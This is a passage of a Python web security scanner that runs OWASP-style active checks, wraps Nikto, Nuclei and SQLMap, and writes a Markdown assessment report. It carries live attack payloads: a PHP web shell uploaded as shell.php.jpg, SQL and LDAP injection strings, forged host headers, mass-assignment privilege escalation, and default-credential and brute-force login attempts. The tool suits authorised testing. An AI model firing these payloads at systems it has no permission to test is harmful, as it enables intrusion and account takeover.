                               f"`{login_path}` has no detectable CSRF token.",
                               "Add per-session CSRF tokens to all state-changing forms and APIs.",
                               "", base_url+login_path))
    return findings


def check_rate_limiting(base_url, auth, preset_cfg):
    """A04 — brute-force / no rate limiting on login."""
    findings = []
    login_path   = preset_cfg.get("login_path","/login")
    login_method = preset_cfg.get("login_method","form")
    login_url    = base_url.rstrip("/")+login_path
    fail_count   = 0
    for _ in range(10):
        try:
            if login_method == "json":
                r = requests.post(login_url, json={"email":"rl@test.com","password":"wrong"},
                                  timeout=4, verify=False)
            else:
                r = requests.post(login_url, data={"username":"rl_test","password":"wrong"},
                                  timeout=4, verify=False)
            if r and r.status_code not in (429,423,503): fail_count += 1
        except Exception:
            break
    if fail_count >= 9:
        findings.append(F("A04","high","No rate limiting on login",
                           f"10 consecutive bad logins to `{login_path}` received no 429.",
                           "Implement account lockout or exponential back-off. Add CAPTCHA.",
                           f"{fail_count}/10 not throttled", login_url))
    return findings


def check_default_credentials(base_url, auth, preset_cfg):
    """A07 — default credential pairs."""
    findings = []
    login_path   = preset_cfg.get("login_path","/login")
    login_method = preset_cfg.get("login_method","form")
    login_url    = base_url.rstrip("/")+login_path
    for user, pwd in DEFAULT_CREDS:
        try:
            if login_method == "json":
                r = requests.post(login_url, json={"email":user,"password":pwd},
                                  timeout=4, verify=False)
            else:
                r = requests.post(login_url, data={"username":user,"password":pwd},
                                  timeout=4, verify=False)
            if r and r.status_code in (200,302) and any(
                x in r.text.lower() for x in ["token","dashboard","welcome","logout","success"]
            ):
                findings.append(F("A07","critical",f"Default creds accepted: {user}/{pwd}",
                                   f"The pair `{user}:{pwd}` was accepted by the login endpoint.",
                                   "Force credential change on first login. Remove default accounts.",
                                   f"HTTP {r.status_code}", login_url))
                break
        except Exception:
            pass
    return findings


def check_sri(base_url, auth):
    """A08 — missing Subresource Integrity on external assets."""
    findings = []
    r = _get(base_url, auth, allow_redirects=True)
    if not r: return findings
    body = r.text
    ext_scripts = re.findall(r'<script[^>]+src=["\']https?://[^"\']+["\'][^>]*>', body, re.IGNORECASE)
    no_sri = [s for s in ext_scripts if "integrity=" not in s.lower()]
    if no_sri:
        findings.append(F("A08","medium",f"{len(no_sri)} external script(s) without SRI",
                           "CDN scripts without SRI can be tampered if the CDN is compromised.",
                           "Add integrity and crossorigin attributes to all external <script> tags.",
                           no_sri[0][:200], base_url))
    ext_styles = re.findall(r'<link[^>]+href=["\']https?://[^"\']+["\'][^>]*>', body, re.IGNORECASE)
    no_sri_css = [s for s in ext_styles if "integrity=" not in s.lower()]
    if no_sri_css:
        findings.append(F("A08","low",f"{len(no_sri_css)} external stylesheet(s) without SRI",
                           "External stylesheets without SRI are vulnerable to CDN supply-chain attacks.",
                           "Add integrity attributes to external <link> tags.",
                           no_sri_css[0][:200], base_url))
    return findings


def check_verb_tampering(base_url, auth):
    """EXT — HTTP method enumeration and verb tampering."""
    findings = []
    for path in VERB_TAMPERING_PATHS:
        url = base_url.rstrip("/")+path
        allowed = []
        for method in ["GET","POST","PUT","DELETE","PATCH","OPTIONS","TRACE"]:
            r = _req(method, url, auth, allow_redirects=False)
            if r and r.status_code not in (404,405,501):
                allowed.append(f"{method}={r.status_code}")
        if "TRACE=200" in allowed:
            findings.append(F("EXT","medium",f"HTTP TRACE enabled at {path}",
                               "TRACE allows XST (Cross-Site Tracing) — can expose HttpOnly cookies.",
                               "Disable TRACE method in web server config.", str(allowed), url))
        dangerous = [m for m in allowed if any(x in m for x in ["DELETE","PUT","PATCH"]) and "401" not in m]
        if dangerous:
            findings.append(F("EXT","high",f"Dangerous HTTP methods allowed at {path}",
                               f"Methods {dangerous} are accepted without apparent restriction.",
                               "Restrict HTTP methods to only those required. Require auth for PUT/DELETE.",
                               str(dangerous), url))
    return findings


def check_clickjacking(base_url, auth):
    """EXT — clickjacking frame test."""
    findings = []
    r = _get(base_url, auth, allow_redirects=True)
    if not r: return findings
    h = {k.lower(): v for k, v in r.headers.items()}
    xfo = h.get("x-frame-options","")
    csp = h.get("content-security-policy","")
    if not xfo and "frame-ancestors" not in csp.lower():
        findings.append(F("EXT","medium","Clickjacking — page can be embedded in an iframe",
                           "Neither X-Frame-Options nor CSP frame-ancestors is set.",
                           "Add X-Frame-Options: DENY or CSP frame-ancestors 'none'.", "", base_url))
    return findings


def check_host_header_injection(base_url, auth):
    """EXT — host header injection."""
    findings = []
    try:
        r = requests.get(base_url, headers={**make_headers(auth), "Host":"evil.example.com"},
                         cookies=make_cookies(auth), timeout=8, verify=False, allow_redirects=False)
        if r and "evil.example.com" in (r.text or ""):
            findings.append(F("EXT","high","Host Header Injection",
                               "The response body reflects the injected Host header value.",
                               "Never trust the Host header for redirects or links. Use a configured base URL.",
                               "evil.example.com found in response", base_url))
    except Exception:
        pass
    return findings


def check_graphql(base_url, auth):
    """EXT — GraphQL introspection enabled."""
    findings = []
    query = {"query": "{ __schema { types { name } } }"}
    for ep in ["/graphql","/__graphql","/graphiql","/api/graphql"]:
        url = base_url.rstrip("/")+ep
        r = _post(url, auth, json_body=query)
        if r and r.status_code == 200 and "__schema" in (r.text or ""):
            findings.append(F("EXT","medium",f"GraphQL introspection enabled at {ep}",
                               "Introspection exposes the full API schema to attackers.",
                               "Disable introspection in production. Add query depth/cost limits.",
                               "", url))
            break
    return findings


def check_prototype_pollution(base_url, auth):
    """EXT — prototype pollution via JSON body."""
    findings = []
    payload = {"__proto__":{"polluted":"yes"},"constructor":{"prototype":{"polluted":"yes"}}}
    r = _post(base_url, auth, json_body=payload)
    if r and "polluted" in (r.text or ""):
        findings.append(F("EXT","high","Prototype Pollution",
                           "Server reflects prototype pollution payload back in the response.",
                           "Sanitise JSON keys server-side; reject __proto__ and constructor keys.",
                           "polluted found in response", base_url))
    return findings


def check_ldap_injection(base_url, auth):
    """EXT — LDAP injection probes."""
    findings = []
    ldap_payloads = ["*)(uid=*))(|(uid=*","*)(|(password=*)","admin)(&)","*(|(objectclass=*)"]
    params = ["username","user","login","email","search","q","filter"]
    for param in params:
        for payload in ldap_payloads[:2]:
            r = _get(base_url, auth, params={param:payload})
            if r and any(x in (r.text or "").lower() for x in
                         ["ldap","distinguished name","dn:","objectclass"]):
                findings.append(F("EXT","high",f"LDAP Injection via `{param}`",
                                   f"Payload `{payload}` triggered LDAP-related content in response.",
                                   "Use parameterised LDAP queries. Validate and escape all input.",
                                   r.text[:200], base_url))
                return findings
    return findings


def check_http_parameter_pollution(base_url, auth):
    """EXT — HTTP parameter pollution."""
    findings = []
    test_params = [("id","1"),("id","2")]
    try:
        url = base_url+"?"+"&".join(f"{k}={v}" for k,v in test_params)
        r = requests.get(url, headers=make_headers(auth), cookies=make_cookies(auth),
                         timeout=8, verify=False, allow_redirects=True)
        if r and r.status_code == 200:
            # Can't easily detect HPP outcome without knowing expected behavior,
            # but flag if both params echo back differently
            if "1" in r.text and "2" in r.text:
                findings.append(F("EXT","low","Possible HTTP Parameter Pollution",
                                   "Server accepted duplicate `id` parameters. Behavior depends on server-side parsing.",
                                   "Reject or deduplicate repeated parameters. Log anomalous requests.",
                                   url, url))
    except Exception:
        pass
    return findings


def check_cache_poisoning(base_url, auth):
    """EXT — cache poisoning / unkeyed header reflection."""
    findings = []
    poison_headers = {
        "X-Forwarded-Host": "evil.example.com",
        "X-Forwarded-For":  "127.0.0.1",
        "X-Original-URL":   "/admin",
        "X-Rewrite-URL":    "/admin",
    }
    for hdr, val in poison_headers.items():
        try:
            h = {**make_headers(auth), hdr: val}
            r = requests.get(base_url, headers=h, cookies=make_cookies(auth),
                             timeout=8, verify=False)
            if r and val in (r.text or ""):
                findings.append(F("EXT","high",f"Cache Poisoning — `{hdr}` reflected",
                                   f"Header `{hdr}: {val}` was reflected in the response body.",
                                   "Never trust injected forwarded headers. Validate against trusted proxy list.",
                                   f"{hdr}: {val} → in body", base_url))
        except Exception:
            pass
    return findings


def check_websocket(base_url, auth):
    """EXT — detect WebSocket endpoint hints."""
    findings = []
    r = _get(base_url, auth, allow_redirects=True)
    if not r: return findings
    body = r.text.lower()
    if "websocket" in body or "ws://" in body or "wss://" in body:
        findings.append(F("EXT","info","WebSocket usage detected",
                           "Page source references WebSocket connections. Review for auth and message validation.",
                           "Authenticate WebSocket connections. Validate all messages server-side. Use wss:// only.",
                           "", base_url))
    return findings


def check_file_upload(base_url, auth):
    """EXT — file upload bypass probes."""
    findings = []
    upload_paths = ["/upload","/api/upload","/file/upload","/uploads","/import"]
    for path in upload_paths:
        url = base_url.rstrip("/")+path
        # Try uploading a PHP shell disguised as an image
        files = {"file": ("shell.php.jpg", b"<?php system($_GET['cmd']); ?>", "image/jpeg")}
        try:
            r = requests.post(url, headers=make_headers(auth), cookies=make_cookies(auth),
                              files=files, timeout=8, verify=False)
            if r and r.status_code in (200,201) and any(
                x in r.text.lower() for x in ["upload","success","file","url","path"]
            ):
                findings.append(F("EXT","critical",f"File upload accepted at {path}",
                                   "Server accepted a file with double extension (shell.php.jpg). "
                                   "If served back, this may allow RCE.",
                                   "Validate file type server-side (magic bytes, not just extension). "
                                   "Store uploads outside webroot. Never execute uploaded files.",
                                   r.text[:200], url))
        except Exception:
            pass
    return findings


def check_deserialization(base_url, auth):
    """A08 — unsafe deserialization indicators."""
    findings = []
    r = _get(base_url, auth, allow_redirects=True)
    if not r: return findings
    body = r.text
    patterns = [r'ObjectInputStream',r'pickle\.loads',r'unserialize\s*\(',r'ACED0005',r'rO0AB']
    for pat in patterns:
        if re.search(pat, body, re.IGNORECASE):
            findings.append(F("A08","high","Unsafe deserialization indicator in response",
                               f"Pattern `{pat}` in response body suggests serialized objects.",
                               "Avoid deserializing untrusted data. Use safe formats (JSON). Add integrity checks.",
                               pat, base_url))
            break
    return findings


def check_timing_based(base_url, auth, preset_cfg):
    """EXT — timing-based SQLi and slow response detection."""
    findings = []
    login_path = preset_cfg.get("login_path","/login")
    login_url  = base_url.rstrip("/")+login_path
    sleep_payloads = ["1' AND SLEEP(3)--","1; WAITFOR DELAY '00:00:03'--","1 AND 1=SLEEP(3)"]
    for payload in sleep_payloads:
        try:
            t0 = time.time()
            requests.post(login_url, data={"username":payload,"password":"x"},
                          timeout=6, verify=False)
            elapsed = time.time()-t0
            if elapsed >= 2.8:
                findings.append(F("A03","high","Timing-based SQL Injection hint",
                                   f"Payload `{payload}` caused a ~{elapsed:.1f}s delay — possible blind SQLi.",
                                   "Use parameterised queries. Enable WAF rules for sleep-based SQLi.",
                                   f"Elapsed: {elapsed:.2f}s", login_url))
                break
        except requests.exceptions.Timeout:
            findings.append(F("A03","high","Timing-based SQL Injection hint (timeout)",
                               f"Payload `{payload}` caused a server timeout — possible blind SQLi.",
                               "Use parameterised queries. Enable WAF rules for sleep-based SQLi.",
                               "Request timed out", login_url))
            break
        except Exception:
            pass
    return findings


def check_business_logic(base_url, auth):
    """EXT — negative quantity, price manipulation, mass assignment probes."""
    findings = []
    # Negative quantity probe
    for ep in ["/api/cart","/rest/basket","/api/order","/shop/cart"]:
        url = base_url.rstrip("/")+ep
        r = _post(url, auth, json_body={"quantity":-1,"productId":1,"price":-9999})
        if r and r.status_code in (200,201):
            try:
                j = r.json()
                if "quantity" in str(j).lower() or "price" in str(j).lower():
                    findings.append(F("EXT","high","Business Logic — negative quantity/price accepted",
                                       f"Endpoint `{ep}` accepted a negative quantity (-1) or negative price.",
                                       "Validate all numeric inputs server-side. Enforce non-negative constraints.",
                                       r.text[:200], url))
            except Exception:
                pass
    # Mass assignment probe
    for ep in ["/api/users/me","/rest/user/me","/api/profile"]:
        url = base_url.rstrip("/")+ep
        r = _req("PUT", url, auth, json={"isAdmin":True,"role":"admin","admin":True})
        if r and r.status_code in (200,201):
            try:
                j = r.json()
                if any(x in str(j).lower() for x in ["admin","role","true"]):
                    findings.append(F("EXT","critical","Mass Assignment — privilege escalation via PUT",
                                       f"PUT to `{ep}` with isAdmin:true accepted. Response suggests role change.",
                                       "Whitelist updateable fields server-side. Never bind raw request body to model.",
                                       r.text[:200], url))
            except Exception:
                pass
    return findings


# ── Nikto / Nuclei / SQLMap wrappers (unchanged logic, same as before) ──────

def parse_nikto(stdout):
    findings = []
    for line in stdout.splitlines():
        line = line.strip()
        if not line.startswith("+ ") or line.startswith("+ Target") or line.startswith("+ Start"):
            continue
        path, desc_raw = "", line[2:]
        if desc_raw.startswith("/"):
            parts = desc_raw.split(":",1)
            path = parts[0].strip()
            desc_raw = parts[1].strip() if len(parts)>1 else desc_raw
        refs = re.findall(r"(OSVDB-\d+|CVE-\d{4}-\d+)", desc_raw)
        sev, desc, rem = "info", desc_raw, "Review this finding manually."
        title = desc_raw[:80]
        combined = (path+" "+desc_raw).lower()
        for kw,(s,d,r) in NIKTO_SEVERITY_MAP.items():
            if kw.lower() in combined:
                sev,desc,rem,title = s,d,r,d; break
        findings.append({"path":path or "(server-level)","raw":line[2:],"severity":sev,
                          "title":title,"description":desc,"remediation":rem,"refs":refs,"owasp":"A05"})
    return sorted(findings, key=lambda f: SEVERITY_ORDER.get(f["severity"],5))

def render_nikto(findings, raw):
    if not findings:
        return "_No Nikto findings._\n\n<details><summary>Raw output</summary>\n\n```\n"+raw+"\n```\n</details>"
    counts = {}
    for f in findings: counts[f["severity"]] = counts.get(f["severity"],0)+1
    lines = ["**Summary:** "+" | ".join(f"{SEVERITY_BADGE[s]}: {n}" for s,n in
             sorted(counts.items(),key=lambda x:SEVERITY_ORDER.get(x[0],5)))+"\n"]
    for i,f in enumerate(findings,1):
        badge = SEVERITY_BADGE.get(f["severity"],"⚫ UNKNOWN")
        lines += [f"### N-{i:02d} — {badge}","| Field | Detail |","|-------|--------|",
                  f"| **Severity** | {badge} |",f"| **Path** | `{f['path']}` |",
                  f"| **Description** | {f['description']} |",f"| **Remediation** | {f['remediation']} |"]
        if f["refs"]: lines.append(f"| **References** | {', '.join(f['refs'])} |")
        lines += ["",f"> Raw: `{f['raw'][:200]}`",""]
    lines.append("<details><summary>Full Nikto output</summary>\n\n```\n"+raw+"\n```\n</details>")
    return "\n".join(lines)

def parse_nuclei(stdout):
    ansi = re.compile(r'\x1b\[[0-9;]*m')
    findings = []
    for line in ansi.sub("",stdout).splitlines():
        line = line.strip()
        if not line.startswith("["): continue
        parts = re.findall(r'\[([^\]]+)\]', line)
        url_m = re.search(r'\]\s+(https?://\S+)', line)
        if len(parts)<3: continue
        sev = parts[2].strip().lower()
        findings.append({"template":parts[0],"protocol":parts[1],"severity":sev if sev in SEVERITY_ORDER else "unknown",
                          "url":url_m.group(1) if url_m else "","matcher":parts[3] if len(parts)>3 else "",
                          "title":parts[0].replace("-"," ").replace("_"," ").title(),"raw":line})
    return sorted(findings,key=lambda f:SEVERITY_ORDER.get(f["severity"],5))

def render_nuclei(findings, raw):
    if not findings:
        return "_No Nuclei findings._\n\n<details><summary>Raw output</summary>\n\n```\n"+raw+"\n```\n</details>"
    counts = {}
    for f in findings: counts[f["severity"]] = counts.get(f["severity"],0)+1
    lines = ["**Summary:** "+" | ".join(f"{SEVERITY_BADGE[s]}: {n}" for s,n in
             sorted(counts.items(),key=lambda x:SEVERITY_ORDER.get(x[0],5)))+"\n"]
    for i,f in enumerate(findings,1):
        badge = SEVERITY_BADGE.get(f["severity"],"⚫ UNKNOWN")
        lines += [f"### V-{i:02d} — {badge}: {f['title']}","| Field | Detail |","|-------|--------|",
                  f"| **Severity** | {badge} |",f"| **Template** | `{f['template']}` |",
                  f"| **Protocol** | {f['protocol']} |",f"| **URL** | `{f['url']}` |"]
        if f["matcher"]: lines.append(f"| **Matcher** | `{f['matcher']}` |")
        lines += ["",f"> Raw: `{f['raw'][:200]}`",""]
    lines.append("<details><summary>Full Nuclei output</summary>\n\n```\n"+raw+"\n```\n</details>")
    return "\n".join(lines)

def parse_sqlmap_block(text):
    findings = []
    for block in re.split(r'(?=Parameter:)', text):
        m = re.search(r'Parameter:\s+(\S+)\s+\((\w+)\)', block)
        if not m: continue
        param, method = m.group(1), m.group(2)
        for t,title,payload in zip(re.findall(r'Type:\s+(.+)',block),
                                    re.findall(r'Title:\s+(.+)',block),
                                    re.findall(r'Payload:\s+(.+)',block)):
            tl = t.lower()
            sev = "critical" if ("union" in tl or "stacked" in tl) else \
                  "high"     if ("time" in tl or "boolean" in tl or "error" in tl) else "medium"
            findings.append({"param":param,"method":method,"type":t.strip(),"title":title.strip(),
                              "payload":payload.strip(),"severity":sev,"owasp":"A03"})
    return findings

def render_sqlmap(per_ep):
    all_f, raw_blocks = [], []
    for method, url, stdout in per_ep:
        parsed = parse_sqlmap_block(stdout)
        for f in parsed: f["endpoint"] = f"{method} {url}"
        all_f.extend(parsed)
        raw_blocks.append(f"#### {method} {url}\n```\n{stdout}\n```")
    all_f.sort(key=lambda f:SEVERITY_ORDER.get(f["severity"],5))
    lines = []
    if not all_f:
        lines.append("_No SQL injection detected by SQLMap._")
    else:
        counts = {}
        for f in all_f: counts[f["severity"]] = counts.get(f["severity"],0)+1
        lines.append("**Summary:** "+" | ".join(f"{SEVERITY_BADGE[s]}: {n}" for s,n in
                     sorted(counts.items(),key=lambda x:SEVERITY_ORDER.get(x[0],5)))+"\n")
        for i,f in enumerate(all_f,1):
            badge = SEVERITY_BADGE.get(f["severity"],"⚫ UNKNOWN")
            lines += [f"### S-{i:02d} — {badge}: SQLi in `{f['param']}`","| Field | Detail |","|-------|--------|",
                      f"| **Severity** | {badge} |",f"| **OWASP** | A03 — Injection |",
                      f"| **Endpoint** | `{f['endpoint']}` |",f"| **Parameter** | `{f['param']}` ({f['method']}) |",
                      f"| **Type** | {f['type']} |",f"| **Technique** | {f['title']} |",
                      f"| **PoC Payload** | `{f['payload']}` |",
                      f"| **Remediation** | Use parameterised queries / prepared statements. |",""]
    lines.append("<details><summary>Full SQLMap output</summary>\n\n"+"\n\n".join(raw_blocks)+"\n</details>")
    return "\n".join(lines)


# ── OWASP section renderer ───────────────────────────────────────────────────
def render_owasp(findings):
    if not findings: return "_No active-check findings._"
    counts = {}
    for f in findings: counts[f["severity"]] = counts.get(f["severity"],0)+1
    lines = ["**Summary:** "+" | ".join(f"{SEVERITY_BADGE[s]}: {n}" for s,n in
             sorted(counts.items(),key=lambda x:SEVERITY_ORDER.get(x[0],5)))+"\n"]
    # Each finding gets its own ### heading (no ### category grouping headers).
    # This means the frontend can split cleanly on <h3> and every split point
    # is exactly one finding — no orphan category-header parts.
    for counter, f in enumerate(findings, 1):
        badge = SEVERITY_BADGE.get(f["severity"],"⚫ UNKNOWN")
        owasp_label = OWASP_NAMES.get(f["owasp"], f["owasp"])
        lines += [
            f"### O-{counter:02d} — {badge}: {f['title']}",
            "| Field | Detail |",
            "|-------|--------|",
            f"| **Severity** | {badge} |",
            f"| **OWASP** | {owasp_label} |",
            f"| **Endpoint** | `{f['endpoint'] or '(root)'}` |",
            f"| **Description** | {f['description']} |",
            f"| **Remediation** | {f['remediation']} |",
        ]
        if f.get("evidence"):
            lines.append(f"| **Evidence** | `{f['evidence']}` |")
        lines.append("")
    return "\n".join(lines)


# ── Report ───────────────────────────────────────────────────────────────────
def exec_summary(nikto_f, nuclei_f, sqlmap_f, owasp_f):
    all_f = ([(f["severity"],"Nikto",f["title"][:55]) for f in nikto_f] +
             [(f["severity"],"Nuclei",f["title"][:55]) for f in nuclei_f] +
             [(f["severity"],"SQLMap",f"SQLi in {f['param']}") for f in sqlmap_f] +
             [(f["severity"],f"OWASP {f['owasp']}",f["title"][:55]) for f in owasp_f])
    all_f.sort(key=lambda x:SEVERITY_ORDER.get(x[0],5))
    if not all_f: return "_No findings._"
    rows = ["| # | Severity | Tool | Finding |","|---|----------|------|---------|"]
    for i,(sev,tool,title) in enumerate(all_f,1):
        rows.append(f"| {i} | {SEVERITY_BADGE.get(sev,sev)} | {tool} | {title} |")
    return "\n".join(rows)


def save_report(target_url, mode, nikto_out, nuclei_out, sqlmap_results, owasp_findings):

    nikto_f  = parse_nikto(nikto_out)
    nuclei_f = parse_nuclei(nuclei_out)
    sqlmap_f = []
    for method, ep_url, stdout in sqlmap_results:
        parsed = parse_sqlmap_block(stdout)
        for f in parsed: f["endpoint"] = f"{method} {ep_url}"
        sqlmap_f.extend(parsed)
    sqlmap_f.sort(key=lambda f:SEVERITY_ORDER.get(f["severity"],5))

    all_f = nikto_f + nuclei_f + sqlmap_f + owasp_findings
    total  = len(all_f)
    crit_high = sum(1 for f in all_f if f["severity"] in ("critical","high"))

    content = f"""# Security Assessment Report

| | |
|---|---|
| **Target URL** | {target_url} |
| **Scan Mode** | {mode.upper()} |
| **Scan Date** | {datetime.datetime.now().strftime("%Y-%m-%d %H:%M")} |
| **Total Findings** | {total} |
| **Critical / High** | {crit_high} |
| **Framework** | OWASP Top 10 (2021) |

---

## Executive Summary

{exec_summary(nikto_f, nuclei_f, sqlmap_f, owasp_findings)}

---

## 1. Infrastructure Scan (Nikto)

{render_nikto(nikto_f, nikto_out)}

---

## 2. Vulnerability Scan (Nuclei)

{render_nuclei(nuclei_f, nuclei_out)}

---

## 3. SQL Injection Analysis (SQLMap)

{render_sqlmap(sqlmap_results)}

---

## 4. OWASP Top 10 + Extended Active Checks

{render_owasp(owasp_findings)}
"""
    print(f"[+] Report generated ({total} findings, {crit_high} critical/high)")

    # Print report to stdout with delimiters so app.py can extract it
    print("===AEGIS_REPORT_START===")
    print(content)
    print("===AEGIS_REPORT_END===")


# ── SQLMap runner ─────────────────────────────────────────────────────────────
def build_sqlmap_auth(auth):
    flags = []
    if not auth: return flags
    cookies = [f"{k}={v}" for k,v in auth.items() if k!="Authorization"]
    if cookies: flags.append(f"--cookie={'; '.join(cookies)}")
    bearer = auth.get("Authorization")
    if bearer: flags.extend(["--headers",f"Authorization: {bearer}"])
    return flags

def run_sqlmap(endpoints, auth, deep=False):
    results = []
    auth_flags = build_sqlmap_auth(auth)
    level = "5" if deep else "3"
    risk  = "3" if deep else "2"
    for url, method, params in endpoints:
        cmd = ["sqlmap","--batch","--no-cast",f"--level={level}",f"--risk={risk}",
               "--technique=BEUS","--output-dir=/tmp/sqlmap_out"]
        if method=="POST":
            cmd.extend(["-u",url,"--data","&".join(f"{k}={v}" for k,v in params.items())])
        else:
            cmd.extend(["-u",f"{url}?{'&'.join(f'{k}={v}' for k,v in params.items())}"])
        cmd.extend(auth_flags)
        print(f"    [sqlmap] {method} {url}")
        res = subprocess.run(cmd, capture_output=True, text=True)
        results.append((method, url, res.stdout))
    return results


# ── Main scanner ──────────────────────────────────────────────────────────────
def run_active_checks(target_url, mode, auth, preset_cfg):
    """Run all active checks; return combined sorted findings."""
    # Standard checks (always run)
    standard_checks = [
        lambda: check_security_headers(target_url, auth),
        lambda: check_cookies(target_url, auth),
        lambda: check_https(target_url),
        lambda: check_sensitive_paths(target_url, auth),
        lambda: check_idor(target_url, auth, preset_cfg),
        lambda: check_admin_exposure(target_url, auth, preset_cfg),
        lambda: check_xss(target_url, auth, preset_cfg),
        lambda: check_version_disclosure(target_url, auth),
        lambda: check_sensitive_data_exposure(target_url, auth),
        lambda: check_auth_endpoints(target_url, auth, preset_cfg),
        lambda: check_verbose_errors(target_url, auth),
        lambda: check_cors(target_url, auth),
    ]
    # Deep-only checks
    deep_checks = [
        lambda: check_ssti(target_url, auth, preset_cfg),
        lambda: check_path_traversal(target_url, auth),
        lambda: check_command_injection(target_url, auth),
        lambda: check_xxe(target_url, auth),
        lambda: check_ssrf(target_url, auth),
        lambda: check_open_redirect(target_url, auth, preset_cfg),
        lambda: check_jwt(target_url, auth, preset_cfg),
        lambda: check_csrf(target_url, auth, preset_cfg),
        lambda: check_rate_limiting(target_url, auth, preset_cfg),
        lambda: check_default_credentials(target_url, auth, preset_cfg),
        lambda: check_sri(target_url, auth),
        lambda: check_verb_tampering(target_url, auth),
        lambda: check_clickjacking(target_url, auth),
        lambda: check_host_header_injection(target_url, auth),
        lambda: check_graphql(target_url, auth),
        lambda: check_prototype_pollution(target_url, auth),
        lambda: check_ldap_injection(target_url, auth),
        lambda: check_http_parameter_pollution(target_url, auth),
        lambda: check_cache_poisoning(target_url, auth),
        lambda: check_websocket(target_url, auth),
        lambda: check_file_upload(target_url, auth),
        lambda: check_deserialization(target_url, auth),
        lambda: check_timing_based(target_url, auth, preset_cfg),
        lambda: check_business_logic(target_url, auth),
    ]

    checks = standard_checks + (deep_checks if mode == "deep" else [])
    all_findings = []
    workers = 6 if mode == "deep" else 4
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(fn): fn for fn in checks}
        for future in as_completed(futures):
            try:
                all_findings.extend(future.result())
            except Exception as e:
                print(f"    [!] Check error: {e}")

    return sorted(all_findings, key=lambda f: SEVERITY_ORDER.get(f["severity"],5))


def execute_scan(target_url, mode, auth, preset_cfg, sqlmap_endpoints):
    print(f"\n[*] Target : {target_url}")
    print(f"[*] Mode   : {mode.upper()}")

    # ── Nikto ─────────────────────────────────────────────────────────────────
    print(f"\n  [1/4] Nikto")
    nikto_stdout = ""
    try:
        nikto_tuning = "123bde" if mode == "standard" else "123456789abcde"
        nikto_res = subprocess.run(
            ["nikto","-h",target_url,"-Tuning",nikto_tuning,"-maxtime","120"],
            capture_output=True, text=True,
        )
        nikto_stdout = nikto_res.stdout or ""
    except FileNotFoundError:
        print("    [!] Nikto not installed — skipping")
    except Exception as e:
        print(f"    [!] Nikto error: {e}")

    # ── Nuclei ────────────────────────────────────────────────────────────────
    print(f"  [2/4] Nuclei")
    nuclei_stdout = ""
    try:
        nuclei_tags = "owasp,cve,misconfig,exposure,token,auth,xss,sqli"
        if mode == "deep":
            nuclei_tags += ",ssrf,xxe,rce,lfi,ssti,redirect,injection,default-login,traversal"
        nuclei_cmd = ["nuclei","-u",target_url,"-as","-silent","-tags",nuclei_tags]
        if auth:
            for k,v in auth.items():
                if k=="Authorization": nuclei_cmd.extend(["-header",f"Authorization: {v}"])
                else: nuclei_cmd.extend(["-header",f"Cookie: {k}={v}"])
        nuclei_res = subprocess.run(nuclei_cmd, capture_output=True, text=True)
        nuclei_stdout = nuclei_res.stdout or ""
    except FileNotFoundError:
        print("    [!] Nuclei not installed — skipping")
    except Exception as e:
        print(f"    [!] Nuclei error: {e}")

    # ── SQLMap ────────────────────────────────────────────────────────────────
    print(f"  [3/4] SQLMap")
    sqlmap_results = []
    try:
        sqlmap_results = run_sqlmap(sqlmap_endpoints, auth, deep=(mode=="deep")) if sqlmap_endpoints else []
    except FileNotFoundError:
        print("    [!] SQLMap not installed — skipping")
    except Exception as e:
        print(f"    [!] SQLMap error: {e}")

    # ── Active OWASP checks ───────────────────────────────────────────────────
    print(f"  [4/4] Active checks ({'deep' if mode=='deep' else 'standard'})")
    owasp_findings = run_active_checks(target_url, mode, auth, preset_cfg)

    save_report(target_url, mode, nikto_stdout, nuclei_stdout, sqlmap_results, owasp_findings)


# ── Entry point ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Security scanner — URL-based, supports standard and deep modes"
    )
    parser.add_argument("--url",         required=False, help="Target URL (http:// or https://)")
    parser.add_argument("--mode",        choices=["standard","deep"], default="standard")
    parser.add_argument("--preset",      choices=list(PRESETS.keys()), default=None,
                        help="Known target preset for hint-driven checks")
    parser.add_argument("--token",       default="", help="Bearer token for auth")
    parser.add_argument("--cookie-str",  default="", help="Cookie string e.g. 'session=abc; csrf=xyz'")
    parser.add_argument("--username",    default="", help="Username for login auth")
    parser.add_argument("--password",    default="", help="Password for login auth")
    parser.add_argument("--list",        action="store_true", help="List available presets and exit")
    args = parser.parse_args()

    if args.list:
        print("Available presets:", ", ".join(PRESETS.keys()))
        sys.exit(0)

    if not args.url:
        parser.error("--url is required")

    target_url = args.url.rstrip("/")

    # ── Build auth ────────────────────────────────────────────────────────────
    # Priority: token/cookie-str from CLI > preset login > username/password login
    auth = None
    if args.token or args.cookie_str:
        auth = build_auth_from_args(args)
        print(f"[*] Using provided auth credentials")
    elif args.preset or args.username:
        auth = get_auth_session(
            args.preset or "", target_url,
            args.username or None, args.password or None
        )
    if auth is None:
        print(f"[!] No auth — proceeding unauthenticated")

    # ── Select preset config ──────────────────────────────────────────────────
    preset_cfg = PRESETS.get(args.preset, {
        "login_path":    "/login",
        "login_method":  "form",
        "idor_paths":    [],
        "admin_paths":   ["/admin","/administrator","/admin/login"],
        "xss_params":    [],
        "jwt_paths":     [],
        "redirect_param":None,
        "sensitive":     [],
    })

    # ── SQLMap endpoints ──────────────────────────────────────────────────────
    # For presets: use configured endpoints; for custom URLs: probe /login and common API paths
    if args.preset:
        sqlmap_endpoints = preset_cfg.get("sqlmap_endpoints", [])
    else:
        sqlmap_endpoints = [
            (target_url + "/search",  "GET",  {"q":"test"}),
            (target_url + "/login",   "POST", {"username":"test","password":"test"}),
            (target_url + "/api/items","GET", {"id":"1"}),
        ]

    execute_scan(target_url, args.mode, auth, preset_cfg, sqlmap_endpoints)